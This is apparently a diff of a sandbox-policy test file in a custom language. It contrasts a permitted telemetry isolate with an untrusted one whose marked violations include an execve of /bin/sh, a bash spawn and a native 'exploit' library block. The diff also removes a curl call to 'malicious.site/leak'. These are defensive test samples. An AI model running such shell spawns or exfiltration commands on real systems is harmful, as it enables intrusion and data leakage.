@@ -1,27 +1,42 @@
 @0ms: {
-    // Sandbox isolate with strict seccomp profile allowing only standard I/O
-    @seccomp("sys_read", "sys_write", "sys_exit")
-    isolate worker_sandbox {
+    // 1. Fully permitted sandbox isolate with explicit telemetry whitelist
+    @seccomp("sys_read", "sys_write", "sys_exit", "sys_getpid", "sys_nanosleep")
+    isolate telemetry_agent {
         enable memory(64KB)
-        enable cpu(500ms)
+        enable cpu(1000ms)
         require System.Syscall
         require System.Log
 
-        let log_msg = "Safe preamble message.\n"
-        let ok_write = syscall("sys_write", 1, log_msg, len(log_msg)) taking 2ms
+        // Permitted standard I/O (sys_write)
+        let msg = "telemetry stream online\n"
+        let w_res = syscall("sys_write", 1, msg, len(msg)) taking 2ms
 
-        // ❌ VIOLATION 1: Forbidden Raw Syscall 'sys_ptrace' (Tracing / Debugging exploit)
-        let trace_res = syscall("sys_ptrace", 0, 0, 0) taking 1ms
+        // Permitted PID query (sys_getpid)
+        let pid = syscall("sys_getpid") taking 1ms
 
-        // ❌ VIOLATION 2: Forbidden Raw Syscall 'sys_execve' (Shell / Process execution bypass)
+        // Permitted clean exit (sys_exit)
+        let exit_code = syscall("sys_exit", 0) taking 1ms
+    }
+
+    // 2. Restricted sandbox isolate blocking unauthorized system operations
+    @seccomp("sys_read", "sys_write", "sys_exit")
+    isolate untrusted_processor {
+        enable memory(32KB)
+        enable cpu(500ms)
+        require System.Syscall
+
+        // Permitted payload read (sys_read)
+        let buffer = syscall("sys_read", 0, 1024) taking 2ms
+
+        // Violation: Forbidden process execution bypass (sys_execve)
         let exec_res = syscall("sys_execve", "/bin/sh", 0, 0) taking 1ms
 
-        // ❌ VIOLATION 3: Blocked security routine call (Process execution attempt)
-        let proc = System.Process.exec("curl https://malicious.site/leak")
+        // Violation: Forbidden raw process spawn
+        let proc = System.Process.spawn("/bin/bash")
 
-        // ❌ VIOLATION 4: Forbidden Foreign FFI Block inside seccomp sandbox
+        // Violation: Forbidden native FFI block inside sandbox
         foreign "libnative_exploit.so" abi("C") {
-            routine trigger_kernel_exploit() -> i32 taking 5ms
+            routine trigger_native_call() -> i32 taking 5ms
         }
     }
 }
